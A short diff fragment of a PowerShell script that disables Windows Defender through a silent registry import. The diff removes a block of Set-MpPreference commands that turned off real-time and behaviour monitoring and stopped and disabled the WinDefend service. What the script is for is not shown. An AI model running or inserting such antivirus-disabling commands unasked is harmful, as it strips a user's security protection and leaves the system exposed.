@@ -18,20 +18,7 @@ Windows Registry Editor Version 5.00
     try {
         Start-Process regedit.exe -ArgumentList "/s $regFilePath" -Wait -ErrorAction Stop
     } catch {
-        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to disable Windows Defender via registry: $_" -ErrorAction SilentlyContinue
-    }
-
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $true
-        Set-MpPreference -DisableBehaviorMonitoring $true
-        Set-MpPreference -DisableIOAVProtection $true
-        Set-MpPreference -DisablePrivacyMode $true
-        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
-        Stop-Service -Name "WinDefend" -Force
-        Set-Service -Name "WinDefend" -StartupType Disabled
-        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Windows Defender services disabled successfully" -ErrorAction SilentlyContinue
-    } catch {
-        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to disable Windows Defender services: $_" -ErrorAction SilentlyContinue
+        Add-Content -Path "$env:TEMP\script_log.txt" -Value "Failed to disable Windows Defender: $_" -ErrorAction SilentlyContinue
     }
 }
 
